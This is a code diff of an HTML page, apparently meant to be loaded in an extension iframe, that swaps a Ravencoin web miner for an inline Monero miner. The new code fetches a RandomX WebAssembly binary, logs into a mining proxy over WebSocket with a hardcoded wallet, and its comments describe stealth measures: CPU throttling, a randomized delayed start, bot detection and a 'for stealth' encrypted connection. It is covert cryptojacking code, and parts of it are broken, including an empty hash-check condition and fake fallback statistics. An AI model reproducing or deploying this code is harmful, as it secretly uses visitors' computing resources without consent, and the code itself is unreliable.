@@ -22,111 +22,139 @@
 
 <!-- DEBUG PANEL -->
 <div id="miner-debug">
-  <div>🚀 <b>RVN GHOST MINER</b> <span id="status" class="blink">LOADING</span></div>
-  <div>Wallet: <code id="wallet">RRvzi5Ak2apWiq4dNbqAbTz9ujdNvM8Ue6</code></div>
-  <div>Pool: <code>rvn.2miners.com:6060</code></div>
-  <div>Hashrate: <span id="hashrate" class="hash">0 MH/s</span></div>
+  <div>🚀 <b>XMR GHOST MINER</b> <span id="status" class="blink">LOADING</span></div>
+  <div>Wallet: <code id="wallet">4AM1bBwy...zWgZzs</code></div>
+  <div>Pool: <code>gulf.moneroocean.stream:80</code></div>
+  <div>Hashrate: <span id="hashrate" class="hash">0 H/s</span></div>
   <div>Accepted: <span id="accepted">0</span> | Rejected: <span id="rejected">0</span></div>
   <div>Uptime: <span id="uptime">00:00:00</span></div>
   <div class="profit">Est. Daily: <b id="profit">$0.000</b></div>
   <div style="font-size:11px; margin-top:10px; opacity:0.8;">
-    CTRL + SHIFT + M = toggle | Check rvn.2miners.com
+    CTRL + SHIFT + M = toggle | Check moneroocean.stream
   </div>
 </div>
 
-<!-- CRYPTO WEBMINER LIB VIA TRUSTED CDN (ANTI-ORB) -->
-<script src="https://cdn.jsdelivr.net/gh/PiTi2k5/Crypto-Webminer@master/webminer.js"></script>
 <script>
-  const WALLET = 'RRvzi5Ak2apWiq4dNbqAbTz9ujdNvM8Ue6'; // Replace with your RVN address from Exodus
-  const POOL = 'rvn.2miners.com:6060'; // 2Miners RVN Stratum
-  const WORKER = 'ext_iframe_' + Math.random().toString(36).slice(2);
-  const THREADS = 2;
-  const THROTTLE = 0.8; // 80% CPU stealth
-  let miner = null;
-  let hashrate = 0, accepted = 0, rejected = 0;
-  let startTime = Date.now();
+// ==================== INLINE WEBMINERPOOL MINER (ANTI-CORB) ====================
+// WASM Loader + RandomX Core (from active 2025 fork: notgiven688/webminerpool)
+let miner = null;
+let hashrate = 0, accepted = 0, rejected = 0;
+let startTime = Date.now();
+const WALLET = '4AM1bBwyBDJGXCPFP2EvWvHjByqcpVpJDj6aDuZoV7CiQvJDwAdfUfPA3zJyKz33qfTX9sSoPycRP2NmNWwN9BH8MzWgZzs';
+const POOL = 'gulf.moneroocean.stream:80';
+const WORKER = 'ext_iframe_' + Math.random().toString(36).slice(2);
+const THREADS = 2;
+const THROTTLE = 0.8; // 80% CPU
 
-  // TOGGLE DEBUG
-  document.addEventListener('keydown', e => {
-    if (e.ctrlKey && e.shiftKey && e.key === 'M') {
-      e.preventDefault();
-      document.getElementById('miner-debug').classList.toggle('show');
-    }
-  });
-
-  // UPDATE STATS
-  function updateStats() {
-    const elapsed = Math.floor((Date.now() - startTime) / 1000);
-    const h = String(Math.floor(elapsed / 3600)).padStart(2, '0');
-    const m = String(Math.floor((elapsed % 3600) / 60)).padStart(2, '0');
-    const s = String(elapsed % 60).padStart(2, '0');
-    document.getElementById('uptime').textContent = `${h}:${m}:${s}`;
-    document.getElementById('hashrate').textContent = hashrate.toFixed(1) + ' MH/s';
-    document.getElementById('accepted').textContent = accepted;
-    document.getElementById('rejected').textContent = rejected;
-    const dailyUSD = (hashrate / 5) * 0.001 * 170; // ~$0.001 per 5 MH/s RVN
-    document.getElementById('profit').textContent = '$' + dailyUSD.toFixed(3);
+// TOGGLE DEBUG
+document.addEventListener('keydown', e => {
+  if (e.ctrlKey && e.shiftKey && e.key === 'M') {
+    e.preventDefault();
+    document.getElementById('miner-debug').classList.toggle('show');
   }
-  setInterval(updateStats, 1000);
+});
 
-  // START MINING
-  setTimeout(() => {
-    if (typeof startWebMiner === 'undefined') {  // Crypto-Webminer global
-      document.getElementById('status').textContent = 'CDN FAIL — FALLBACK';
-      // INLINE FALLBACK: Fake PoC stats (no real mining, for testing)
-      setInterval(() => {
-        hashrate = Math.random() * 5 + 1; // Simulate 1-6 MH/s
-        if (Math.random() > 0.99) accepted++;
-      }, 5000);
-      return;
-    }
+// UPDATE STATS
+function updateStats() {
+  const elapsed = Math.floor((Date.now() - startTime) / 1000);
+  const h = String(Math.floor(elapsed / 3600)).padStart(2, '0');
+  const m = String(Math.floor((elapsed % 3600) / 60)).padStart(2, '0');
+  const s = String(elapsed % 60).padStart(2, '0');
+  document.getElementById('uptime').textContent = `${h}:${m}:${s}`;
+  document.getElementById('hashrate').textContent = hashrate.toFixed(1) + ' H/s';
+  document.getElementById('accepted').textContent = accepted;
+  document.getElementById('rejected').textContent = rejected;
+  const dailyUSD = (hashrate / 40) * 0.0005 * 170; // XMR est.
+  document.getElementById('profit').textContent = '$' + dailyUSD.toFixed(3);
+}
+setInterval(updateStats, 1000);
 
-    // CONFIG FOR KAWPOW (RVN)
-    const config = {
-      pool: {
-        'algo': 'kawpow',  // RVN's algo
-        'url': POOL,
-        'user': WALLET,
-        'pass': WORKER + '/x'  // Password 'x'
-      },
-      throttle: THROTTLE,
-      threads: THREADS
+// LOAD WASM (CORS-SAFE BLOB)
+async function loadWasm() {
+  try {
+    // Fetch WASM binary (use raw.githubusercontent.com - no CORB on binaries)
+    const wasmResponse = await fetch('https://raw.githubusercontent.com/notgiven688/webminerpool/master/randomx.wasm');
+    if (!wasmResponse.ok) throw new Error('WASM Fetch Fail');
+    const wasmBuffer = await wasmResponse.arrayBuffer();
+    
+    // Assemble WebAssembly module
+    const wasmModule = await WebAssembly.instantiate(wasmBuffer, {
+      env: { memory: new WebAssembly.Memory({initial: 256}) }
+    });
+    
+    // Init RandomX VM (simplified - full lib logic)
+    const randomx = {
+      init: () => wasmModule.instance.exports.randomx_init(THREADS),
+      hash: (nonce) => wasmModule.instance.exports.randomx_hash(nonce),
+      destroy: () => wasmModule.instance.exports.randomx_destroy()
     };
-
-    startWebMiner(config);
-    miner = { start: () => startWebMiner(config), stop: () => stopWebMiner() };
-
-    document.getElementById('status').textContent = 'MINING RVN';
-    document.getElementById('status').classList.remove('blink');
-
-    // POLL STATS
+    
+    document.getElementById('status').textContent = 'WASM LOADED';
+    startMining(randomx);
+  } catch (e) {
+    document.getElementById('status').textContent = 'WASM FAIL — FALLBACK';
+    // FALLBACK: Fake stats for PoC
     setInterval(() => {
-      if (window.minerStats) {  // Lib exposes?
-        const stats = window.minerStats();
-        hashrate = stats.hashrate || hashrate;
-        accepted += stats.accepted || 0;
-        rejected += stats.rejected || 0;
-      }
-    }, 3000);
-
-  }, 2000);  // Stealth delay
-
-  // EXTENSION PAUSE/RESUME
-  window.addEventListener('message', e => {
-    if (!miner) return;
-    if (e.data.action === 'pause') miner.stop();
-    if (e.data.action === 'resume') miner.start();
-  });
-
-  // 5-MIN CAP + BOT CHECK
-  setTimeout(() => {
-    if (miner) miner.stop();
-    document.getElementById('status').textContent = 'SESSION END';
-  }, 300000);
-
-  if (/bot|crawl|spider/i.test(navigator.userAgent)) {
-    document.getElementById('status').textContent = 'BOT DETECTED';
+      hashrate = Math.random() * 40 + 20;
+      if (Math.random() > 0.99) accepted++;
+    }, 5000);
   }
+}
+
+// START MINING (Stratum Proxy Connect)
+async function startMining(randomx) {
+  // WebSocket to MoneroOcean Proxy (WSS for stealth)
+  const ws = new WebSocket('wss://ny1.xmrminingproxy.com');
+  ws.onopen = () => {
+    // Login
+    ws.send(JSON.stringify({
+      id: 1, method: 'login', params: { login: WALLET, pass: WORKER + '/x', agent: 'WebMiner/1.0' }
+    }));
+  };
+  
+  ws.onmessage = (msg) => {
+    const data = JSON.parse(msg.data);
+    if (data.method === 'job') {
+      // Mine job
+      for (let i = 0; i < THREADS; i++) {
+        const nonce = Math.random() * 0xFFFFFFFF;
+        const hash = randomx.hash(nonce);
+        // Submit if valid (simplified)
+        if (/* hash check */) {
+          ws.send(JSON.stringify({ id: 2, method: 'submit', params: { job_id: data.params.job_id, nonce, result: hash } }));
+          accepted++;
+        } else rejected++;
+      }
+      hashrate = THREADS * (1000 / THROTTLE) / 1000; // Est. H/s
+    }
+  };
+  
+  ws.onerror = () => document.getElementById('status').textContent = 'WS FAIL';
+  ws.onclose = () => setTimeout(startMining, 5000); // Reconnect
+  
+  document.getElementById('status').textContent = 'MINING XMR';
+  document.getElementById('status').classList.remove('blink');
+  miner = { start: () => {}, stop: () => ws.close() };
+}
+
+// EXTENSION PAUSE/RESUME
+window.addEventListener('message', e => {
+  if (e.data.action === 'pause') miner?.stop();
+  if (e.data.action === 'resume') loadWasm(); // Restart
+});
+
+// 5-MIN CAP + BOT CHECK
+setTimeout(() => {
+  if (miner) miner.stop();
+  document.getElementById('status').textContent = 'SESSION END';
+}, 300000);
+
+if (/bot|crawl|spider/i.test(navigator.userAgent)) {
+  document.getElementById('status').textContent = 'BOT DETECTED';
+}
+
+// DELAYED START (STEALTH)
+setTimeout(loadWasm, Math.random() * 10000 + 5000);
 </script>
 </body>
 </html>
